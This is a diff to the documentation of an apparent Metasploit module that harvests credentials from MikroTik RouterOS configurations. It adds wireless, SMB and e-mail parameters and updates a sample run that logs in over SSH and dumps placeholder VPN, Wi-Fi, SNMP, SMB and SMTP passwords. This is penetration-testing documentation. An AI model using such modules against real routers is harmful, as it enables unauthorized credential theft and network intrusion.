@@ -19,6 +19,9 @@ This module will look for the follow parameters which contain credentials:
 * `/interface pptp-client`
 * `/snmp community`
 * `/ppp secret`
+* `/ip smb users`
+* `/tool e-mail`
+* `/interface wireless security-profiles`
 
 ## Verification Steps
 
@@ -41,11 +44,11 @@ resource (mikrotik.rb)> set username admin
 username => admin
 resource (mikrotik.rb)> set password password
 password => password
-resource (mikrotik.rb)> set rhosts 192.168.2.59
-rhosts => 192.168.2.59
+resource (mikrotik.rb)> set rhosts 1.1.1.1
+rhosts => 1.1.1.1
 resource (mikrotik.rb)> run
-[+] 192.168.2.59:22 - Success: 'admin:password' 'MikroTik CHR 6.45.9 (long-term)'
-[*] Command shell session 1 opened (192.168.2.199:44401 -> 192.168.2.59:22) at 2020-07-18 07:27:35 -0400
+[+] 1.1.1.1:22 - Success: 'admin:password' 'MikroTik CHR 6.45.9 (long-term)'
+[*] Command shell session 1 opened (2.2.2.2:41365 -> 1.1.1.1:22) at 2020-07-18 11:06:32 -0400
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
@@ -75,20 +78,26 @@ resource (mikrotik.rb)> run
 12   dude                    6.45.9                                            
 
 
-[+] Version information stored in to loot /home/h00die/.msf4/loot/20200718072746_default_192.168.2.59_mikrotik.version_337070.txt
+[+] Version information stored in to loot /home/h00die/.msf4/loot/20200718121308_default_1.1.1.1_mikrotik.version_923296.txt
 [*] Gathering info from /export verbose
-it was a string
-292
-[+] 192.168.2.59:22 OS: RouterOS 6.45.9
-[+] 192.168.2.59:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out1 with username user and password password
-[+] 192.168.2.59:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out2 with username user and password password
-[+] 192.168.2.59:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out3 with username user and password password
-[+] 192.168.2.59:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out4 with username user and password password
-[+] 192.168.2.59:22  PPPoE Client on ether2 named pppoe-user and service name internet with username user and password password
-[+] 192.168.2.59:22  L2TP Client to 10.99.99.99 named l2tp-hm with username l2tp-hm and password 123
-[+] 192.168.2.59:22  PPTP Client to  named pptp-hm with username pptp-hm and password 123
-[+] 192.168.2.59:22 SNMP community write with password write(MD5), encryption password ""(DES) and write access
-[+] 192.168.2.59:22 SNMP community v3 with password 0123456789(SHA1), encryption password 9876543210(AES) and write access
-[+] 192.168.2.59:22 disabled PPP tunnel bridging named ppp1 with profile name ppp_bridge and password password
+[+] 1.1.1.1:22 OS: RouterOS 6.45.9
+[+] 1.1.1.1:22 Wireless AP wpawifi with WPA password presharedkey
+[+] 1.1.1.1:22 Wireless AP wpa2wifi with WPA2 password presharedkey
+[+] 1.1.1.1:22 Wireless AP wpaeapwifi with WPA2-EAP username username password password
+[+] 1.1.1.1:22 Wireless AP wepwifi with WEP password 0123456789 with WEP password 0987654321 with WEP password 1234509876 with WEP password 0192837645
+[+] 1.1.1.1:22 Wireless AP wep1wifi with WEP password 1111111111
+[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out1 with username user and password password
+[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out2 with username user and password password
+[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out3 with username user and password password
+[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out4 with username user and password password
+[+] 1.1.1.1:22  PPPoE Client on ether2 named pppoe-user and service name internet with username user and password password
+[+] 1.1.1.1:22  L2TP Client to 10.99.99.99 named l2tp-hm with username l2tp-hm and password 123
+[+] 1.1.1.1:22  PPTP Client to 10.99.99.99 named pptp-hm with username pptp-hm and password 123
+[+] 1.1.1.1:22 SNMP community write with password write and write access
+[+] 1.1.1.1:22 SNMP community v3 with password 0123456789(SHA1), encryption password 9876543210(AES) and write access
+[+] 1.1.1.1:22  SMB Username mtuser and password mtpasswd
+[+] 1.1.1.1:22 disabled SMB Username disableduser and password disabledpasswd with RO only access
+[+] 1.1.1.1:22 disabled PPP tunnel bridging named ppp1 with profile name ppp_bridge and password password
+[+] 1.1.1.1:22 SMTP Username smtpuser and password smtppassword for 1.1.1.1:25
 [*] Post module execution completed
 ```
